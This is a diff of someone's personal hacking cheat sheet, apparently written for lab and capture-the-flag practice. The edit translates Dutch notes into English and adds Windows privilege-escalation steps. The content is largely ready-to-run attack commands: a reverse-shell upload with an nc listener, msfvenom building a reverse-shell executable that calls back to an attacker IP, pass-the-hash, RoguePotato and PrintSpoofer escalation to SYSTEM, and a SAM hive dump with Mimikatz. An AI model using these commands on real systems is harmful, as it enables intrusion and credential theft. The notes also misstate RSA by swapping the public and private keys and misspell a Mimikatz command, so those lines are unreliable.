@@ -45,13 +45,12 @@ Random notes I've made while learning about hacking that might prove useful in t
 `for i in $(seq 1 20); do echo -n “$i: “; curl -s http://10.10.10.10/index.php/$i/ | grep ‘[title]’; done`
 
 ## Wfuzz
-- voorbeeld: `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
-- voorbeeld: `wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php`
-- handige lijsten: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
+- exemple: `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
+- exemple: `wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php`
+- useful lists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
 
 ## Gobuster
-- voorbeeld: `gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`
-- handige lijsten: 
+- example: `gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`
 
 ## Vega
 - website vulnerability scanner
@@ -60,15 +59,11 @@ Random notes I've made while learning about hacking that might prove useful in t
 ## Burp Suite
 - change hostname with Burp sometimes works `Host: cronos.htb`
 
-### Burp Intruder
-- Sniper attack - probeert alle in een wordlist op de plek tussen §
-- Cluster bomb attack - itereert over meerdere lijsten (zoals username/ password)
-
 ## Reverse Shells
 - upload reverse shell (/usr/share/webshells in Kali)
-- verander IP addres en port nummer
-- op je eigen systeem `sudo nc -lvnp [port]`
-- maak een HTTP request naar de shell om hem te runnen
+- change IP address and port number
+- on own system `sudo nc -lvnp [port]`
+- make HTTP request to shell to run
 - reverse shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 - other chear sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - also nice source: https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
@@ -472,6 +467,7 @@ Output file contents:
 - add account to admin group: `net localgroup administrators <username> /add`
 
 ## Windows Privesc
+- examples work on Windows 10
 
 ### Generate reverse shell
 - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
@@ -525,7 +521,36 @@ Output file contents:
 - list saved creds: `cmdkey /list`
 - run as user with saved creds: `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 
+### Get a shell with found password hashes
+- `pth-winexe -U 'admin%hash' //10.10.105.39 cmd.exe` (hash = [NT hash]:[NTLM hash])
 
+### Scheduled tasks
+- check if any scheduled tasks run as SYSTEM
+- let the scheduled script run the reverse shell
+
+### Insecure GUI apps
+- example: Paint runs with SYSTEM privileges
+- file > open > reverse.exe
+
+### Token impersonation
+- from local service to system with Rogue Potato: `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
+- from local service to system with PrintSpoofer: `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
+
+### Windows Privesc Scripts
+- winPEASany.exe
+- Seatbelt.exe
+- PowerUp.ps1
+- SharpUp.exe
+
+## Mimikatz
+- dump SAM hive (in cmd): `reg save HKLM\SAM SAM`
+- dump SYSTEM hive (in cmd): `reg save HKLM\SYSTEM SYSTEM`
+- download mimikatz on Windows PC: https://github.com/0x47root/mimikatz
+- run mimikatz
+- `privilege::debug`
+- `token::elevate`
+- `log hash.txt`
+- `lasdump::sam SYSTEM SAM`
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 # OSINT
 
@@ -558,10 +583,10 @@ Output file contents:
 - useful site: rumkin.com/tools
 
 ## RSA
-- goeie tool: https://github.com/Ganapati/RsaCtfTool
-- ook een goeie: https://github.com/ius/rsatool
-- p en q zijn grote priemgetallen
-- n is het product van p en q
+- useful tool: https://github.com/Ganapati/RsaCtfTool
+- other useful tool: https://github.com/ius/rsatool
+- p and q are large prime numbers
+- n is the product of p and q
 - The public key is n and d, the private key is n and e.
 - “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).
 
